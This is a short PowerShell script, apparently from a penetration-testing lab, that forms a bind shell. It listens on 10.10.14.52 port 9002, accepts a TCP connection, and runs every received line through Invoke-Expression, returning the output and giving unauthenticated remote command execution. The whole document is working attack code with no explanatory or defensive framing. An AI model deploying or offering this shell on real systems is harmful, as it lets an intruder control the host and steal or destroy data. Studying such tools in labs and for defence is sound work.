$listener = New-Object System.Net.Sockets.TCPListener('10.10.14.52', 9002)
$listener.Start()
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
$writer.WriteLine('Connected')
$writer.Flush()
while ($true) {
    $writer.Write('Shell> ')
    $writer.Flush()
    $command = $reader.ReadLine()
    if ($command -eq 'exit') {
        break
    }
    try {
        $output = Invoke-Expression $command 2>&1
        $writer.WriteLine($output)
    } catch {
        $writer.WriteLine($_.Exception.Message)
    }
    $writer.Flush()
}
$client.Close()
$listener.Stop()
